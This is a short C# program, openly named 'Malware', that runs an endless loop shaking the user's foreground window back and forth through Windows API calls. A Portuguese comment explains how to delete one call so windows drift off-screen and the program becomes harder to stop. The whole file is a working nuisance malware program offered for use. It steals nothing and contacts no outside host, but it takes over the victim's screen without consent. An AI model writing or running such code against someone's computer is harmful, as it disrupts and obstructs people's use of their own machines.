using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Project1
{
    public class Malware
    {
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll")]
        private static extern bool GetWindowRect(IntPtr hWnd, out RECT rect);

        [DllImport("user32.dll")]
        private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int x, int y, int cx, int cy, uint uFlags);

        private const uint SWP_NOZORDER = 0x0004;
        private const uint SWP_NOSIZE = 0x0001;

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left;   
            public int Top;    
            public int Right;  
            public int Bottom; 
        }

        static void Main()
        {
            while (true)
            {
                IntPtr hWnd = GetForegroundWindow();

                if (hWnd != IntPtr.Zero && GetWindowRect(hWnd, out RECT rect))
                {
                    for (int i = 0; i < 10; i++) 
                    {
                        //remova um dos setwindows para esconder as janelas para algum dos lados. O malware fica mais chato de parar e voltar as janelas para o lugar
                        SetWindowPos(hWnd, IntPtr.Zero, rect.Left + 10, rect.Top, 0, 0, SWP_NOZORDER | SWP_NOSIZE);
                        Thread.Sleep(30);

                        SetWindowPos(hWnd, IntPtr.Zero, rect.Left - 10, rect.Top, 0, 0, SWP_NOZORDER | SWP_NOSIZE);
                        Thread.Sleep(30); 
                    }
                }

            }
        }

    }
}
